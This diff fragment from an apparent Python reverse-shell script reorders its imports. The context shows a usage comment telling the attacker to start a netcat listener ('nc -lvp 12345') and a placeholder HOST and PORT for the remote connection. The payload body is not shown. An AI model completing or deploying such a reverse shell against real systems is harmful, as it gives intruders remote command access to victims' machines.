@@ -4,9 +4,9 @@
 
 # Usage: nc -lvp 12345 in the attacker machine to set up the listener. Enter quit to end session
 
+import os
 import socket
 import subprocess
-import os
 
 HOST = 'REPLACEME'
 PORT = 12345
